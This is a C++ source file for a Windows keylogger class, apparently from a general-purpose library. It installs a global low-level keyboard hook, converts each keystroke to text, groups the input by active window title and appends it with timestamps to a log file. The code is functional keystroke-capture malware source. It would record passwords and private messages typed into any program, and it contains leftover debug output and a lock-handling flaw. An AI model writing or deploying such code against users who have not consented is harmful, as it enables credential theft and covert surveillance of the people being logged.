#include "GKeyLogger.h"

#if defined(GWIN)
HHOOK		hKeyHook;
#endif
GStringMap	_map;
GString		_fileName;
GString		_path;

GString		GetActiveWindowName(void)
{
	HWND hwd = GetForegroundWindow();
	if (hwd == NULL)
		throw GException("GKeyLogger", "Error GetActiveWindow");
	int max = 1024;
	char buffer[1024];
	int nbChar = GetWindowText(hwd, buffer, max);
	if (nbChar == 0)
		throw GException("GKeyLogger", "Error GetWindowText() !");
	return (buffer);
}

void	WriteKeyLogger(GString Name)
{
	if (!_map[Name].IsEmpty())
	{
		GFile f(_path + _fileName);
		f.Open(true);
		if (!f.IsOpen())
			return ;
		GDateTime d;
		f.GoToEnd();
		f.Write(d.GetDateTime("%dd/%MM/%yyyy %hh:%mm:%ss - "));
		f.Write(Name.LeftJustified(25) + "- " + _map[Name] + "\r\n");
		_map.EraseKey(Name);
		f.Close();
	}
}

#if defined(GWIN)
 __declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam ) 
 {
	GString name = GetActiveWindowName();
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) 
	{
		 // conversion du code -> ascii
		BYTE KeyState[256];
		WORD wBuf;
		char ch;
		// Structure pour récupération des informations
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
		/* Traitement récupération dec codes des touches */
		// Etat du clavier
		GetKeyboardState(KeyState);
		// Conversion code > ascii
		ToAscii(hooked.vkCode, hooked.scanCode ,KeyState,&wBuf,0);
		 //on rajoute les touches non traitées par le hook
		switch (hooked.vkCode)
		{
			case VK_TAB     : { WriteKeyLogger(name); break; }
			case VK_RETURN  : { WriteKeyLogger(name); break; }
			case VK_BACK    : { _map[name] = _map[name].Substr(0, _map[name].Size() - 1); break; }
			case VK_NUMPAD0 : { _map[name] += "0"; break; }
			case VK_NUMPAD1 : { _map[name] += "1"; break; }
			case VK_NUMPAD2 : { _map[name] += "2"; break; }
			case VK_NUMPAD3 : { _map[name] += "3"; break; }
			case VK_NUMPAD4 : { _map[name] += "4"; break; }
			case VK_NUMPAD5 : { _map[name] += "5"; break; }
			case VK_NUMPAD6 : { _map[name] += "6"; break; }
			case VK_NUMPAD7 : { _map[name] += "7"; break; }
			case VK_NUMPAD8 : { _map[name] += "8"; break; }
			case VK_NUMPAD9 : { _map[name] += "9"; break; }
			case VK_MULTIPLY: { _map[name] += "*"; break; }
			case VK_ADD     : { _map[name] += "+"; break; }
			case VK_SUBTRACT: { _map[name] += "-"; break; }
			case VK_DECIMAL : { _map[name] += "."; break; }
			case VK_DIVIDE  : { _map[name] += "/"; break; } 
			case VK_DELETE  : { printf("<Suppr>");break;}
			default : { // on affiche les touches tappées
				ch=((char)wBuf);
				_map[name] += ch;
				break;
				}

		}
	}
	return CallNextHookEx(hKeyHook, nCode,wParam,lParam);
}
#endif

GKeyLogger::GKeyLogger(void)
{
	_path = "c:\\";
	this->_activate = false;
}

GKeyLogger::~GKeyLogger(void)
{
	if (this->_activate)
	{
		this->_mutex.Lock();
		this->_activate = false;
		this->_mutex.Unlock();
		this->_thread.Abort();
	}
}
void		GKeyLogger::SetDirectory(const GString &Path)
{
	_path = Path;
}
void		GKeyLogger::SetFileName(const GString &FileName)
{
	_fileName = FileName;
}
bool		GKeyLogger::IsActivated(void) const
{
	return (this->_activate);
}

void	*th(void *arg)
{
	GKeyLogger *m = (GKeyLogger *)arg;
	m->Start();
	return (NULL);
}

void		GKeyLogger::Activate(void)
{
	if (!this->_activate)
	{
		this->_activate = true;
		this->_thread.SetFunction(&th);
		this->_thread.Start(this);
	}
}

void		GKeyLogger::Start(void)
{
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe)
	{
		this->_activate = false;
		return ;
	}
	hKeyHook = SetWindowsHookEx (WH_KEYBOARD_LL,(HOOKPROC) KeyEvent,hExe, NULL);
	if (hKeyHook == NULL)
	{
		this->_activate = false;
		return ;
	}
	MSG message;
	while (true) 
	{
		std::cout << "1" << std::endl;
		this->_mutex.Lock();
		
		if (this->_activate == false)
		{
			UnhookWindowsHookEx(hKeyHook);
			return ;
		}
		this->_mutex.Unlock();
		std::cout << "2" << std::endl;
		if (GetMessage(&message, NULL, 0, 0))
		{
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
		else
		{
			return ;
		}
	}
}

void		GKeyLogger::Desactivate(void)
{
	if (this->_activate)
	{
		this->_mutex.Lock();
		this->_activate = false;
		this->_mutex.Unlock();
		this->_thread.Abort();
	}
}


